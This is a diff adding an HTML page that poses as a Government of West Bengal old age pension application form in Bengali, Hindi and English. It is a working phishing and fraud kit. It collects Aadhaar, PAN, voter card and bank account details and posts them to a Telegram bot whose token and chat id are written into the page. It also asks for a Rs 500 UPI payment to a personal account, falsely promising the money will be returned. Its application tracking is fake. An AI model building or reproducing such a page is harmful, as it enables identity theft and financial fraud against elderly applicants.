@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Old Age Pension Form</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f8f9fa;
+    padding: 20px;
+  }
+  header {
+    text-align: center;
+    background-color: #004aad;
+    color: white;
+    padding: 15px;
+    border-radius: 5px;
+  }
+  form, .tracking {
+    background: white;
+    padding: 20px;
+    border-radius: 8px;
+    max-width: 600px;
+    margin: 20px auto;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+  input, button, select {
+    width: 100%;
+    padding: 10px;
+    margin-top: 8px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+  }
+  button {
+    background-color: #007b5e;
+    color: white;
+    border: none;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #005f47;
+  }
+  .qr {
+    text-align: center;
+    margin-top: 15px;
+  }
+  .note {
+    text-align: center;
+    color: blue;
+    margin-top: 10px;
+  }
+  .app-number {
+    font-weight: bold;
+    color: darkred;
+  }
+</style>
+<script>
+  // ভাষা পরিবর্তনের জন্য
+  const texts = {
+    en: {
+      title: "Old Age Pension Application Form",
+      gov: "Government of West Bengal",
+      name: "Name",
+      aadhar: "Aadhaar Number",
+      pan: "PAN Number (Optional)",
+      voter: "Voter Card Number",
+      account: "Bank Account Number",
+      ifsc: "IFSC Code",
+      note: "This payment amount will also be credited to your bank account.",
+      pay: "Scan the QR code below to pay ₹500",
+      utr: "Enter UTR Number",
+      submit: "Submit",
+      track: "Track Application",
+      placeholder: "Enter your 20-digit Application Number"
+    },
+    bn: {
+      title: "বার্ধক্য ভাতা আবেদন ফর্ম",
+      gov: "পশ্চিমবঙ্গ সরকার",
+      name: "নাম",
+      aadhar: "আধার নম্বর",
+      pan: "প্যান নম্বর (ঐচ্ছিক)",
+      voter: "ভোটার কার্ড নম্বর",
+      account: "ব্যাংক অ্যাকাউন্ট নম্বর",
+      ifsc: "IFSC কোড",
+      note: "এই পেমেন্ট করা টাকা টাও আপনি আপনার ব্যাংকে পেয়ে যাবেন।",
+      pay: "৫০০ টাকা পরিশোধের জন্য নিচের QR কোড স্ক্যান করুন",
+      utr: "UTR নম্বর লিখুন",
+      submit: "জমা দিন",
+      track: "আবেদন ট্র্যাক করুন",
+      placeholder: "আপনার ২০ ডিজিট আবেদন নম্বর দিন"
+    },
+    hi: {
+      title: "वृद्धावस्था पेंशन आवेदन फॉर्म",
+      gov: "पश्चिम बंगाल सरकार",
+      name: "नाम",
+      aadhar: "आधार नंबर",
+      pan: "पैन नंबर (वैकल्पिक)",
+      voter: "वोटर कार्ड नंबर",
+      account: "बैंक खाता संख्या",
+      ifsc: "IFSC कोड",
+      note: "यह भुगतान की गई राशि आपके बैंक खाते में प्राप्त होगी।",
+      pay: "₹500 भुगतान करने के लिए नीचे दिया गया QR कोड स्कैन करें",
+      utr: "UTR नंबर दर्ज करें",
+      submit: "सबमिट करें",
+      track: "आवेदन ट्रैक करें",
+      placeholder: "अपना 20 अंकों का आवेदन नंबर दर्ज करें"
+    }
+  };
+
+  function changeLanguage(lang) {
+    const t = texts[lang];
+    document.getElementById("title").textContent = t.title;
+    document.getElementById("gov").textContent = t.gov;
+    document.getElementById("labelName").textContent = t.name + ":";
+    document.getElementById("labelAadhar").textContent = t.aadhar + ":";
+    document.getElementById("labelPan").textContent = t.pan + ":";
+    document.getElementById("labelVoter").textContent = t.voter + ":";
+    document.getElementById("labelAccount").textContent = t.account + ":";
+    document.getElementById("labelIfsc").textContent = t.ifsc + ":";
+    document.getElementById("note").textContent = t.note;
+    document.getElementById("payText").textContent = t.pay;
+    document.getElementById("labelUtr").textContent = t.utr + ":";
+    document.getElementById("submitBtn").textContent = t.submit;
+    document.getElementById("trackTitle").textContent = t.track;
+    document.getElementById("trackNum").placeholder = t.placeholder;
+  }
+
+  function generateAppNumber() {
+    return Math.floor(10000000000000000000 + Math.random() * 90000000000000000000);
+  }
+
+  // ফর্ম সাবমিট হলে ডেটা পাঠানোর ফাংশন
+  function handleSubmit(event) {
+    event.preventDefault();
+    const data = {
+      name: document.querySelector('input[name="name"]').value,
+      aadhar: document.querySelector('input[name="aadhar"]').value,
+      pan: document.querySelector('input[name="pan"]').value,
+      voter: document.querySelector('input[name="voter"]').value,
+      account: document.querySelector('input[name="account"]').value,
+      ifsc: document.querySelector('input[name="ifsc"]').value,
+      utr: document.querySelector('input[name="utr"]').value,
+    };
+
+    const message = `নাম: ${data.name}\nআধার: ${data.aadhar}\nপ্যান: ${data.pan}\nভোটার: ${data.voter}\nএকাউন্ট: ${data.account}\nIFSC: ${data.ifsc}\nUTR: ${data.utr}`;
+
+    // টেলিগ্রামে পাঠানো
+    fetch("https://api.telegram.org/bot5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: "-1003102946985",
+        text: message
+      })
+    }).then(response => response.json())
+      .then(data => {
+        document.getElementById("applicationResult").innerHTML = "Thank you! Data stored and sent to your channel.";
+      });
+  }
+
+  function handleTrack() {
+    const trackNum = document.getElementById("trackNum").value.trim();
+    if (trackNum.length === 20) {
+      alert("Your application " + trackNum + " is under process.");
+    } else {
+      alert("Please enter a valid 20-digit Application Number.");
+    }
+  }
+</script>
+</head>
+<body onload="changeLanguage('bn')">
+
+<header>
+  <h1 id="gov">পশ্চিমবঙ্গ সরকার</h1>
+  <select onchange="changeLanguage(this.value)">
+    <option value="bn">বাংলা</option>
+    <option value="hi">हिन्दी</option>
+    <option value="en">English</option>
+  </select>
+</header>
+
+<h2 id="title" style="text-align:center;">বার্ধক্য ভাতা আবেদন ফর্ম</h2>
+
+<form onsubmit="handleSubmit(event)">
+  <label id="labelName">নাম:</label>
+  <input type="text" name="name" required />
+
+  <label id="labelAadhar">আধার নম্বর:</label>
+  <input type="text" name="aadhar" required />
+
+  <label id="labelPan">প্যান নম্বর (ঐচ্ছিক):</label>
+  <input type="text" name="pan" />
+
+  <label id="labelVoter">ভোটার কার্ড নম্বর:</label>
+  <input type="text" name="voter" required />
+
+  <label id="labelAccount">ব্যাংক অ্যাকাউন্ট নম্বর:</label>
+  <input type="text" name="account" required />
+
+  <label id="labelIfsc">IFSC কোড:</label>
+  <input type="text" name="ifsc" required />
+
+  <div class="note" id="note"></div>
+
+  <div class="qr">
+    <p id="payText"></p>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=tadegayatri13@oksbi&pn=Gayatri%20Tade&aid=uGICAgIDD2_iQEA" alt="Payment QR" />
+  </div>
+
+  <label id="labelUtr">UTR নম্বর / UTR नंबर:</label>
+  <input type="text" name="utr" required />
+
+  <button type="submit" id="submitBtn"></button>
+</form>
+
+<div id="applicationResult" class="note"></div>
+
+<div class="tracking">
+  <h3 id="trackTitle"></h3>
+  <input type="text" id="trackNum" placeholder="" />
+  <button onclick="handleTrack()">Track</button>
+</div>
+
+</body>
+</html>
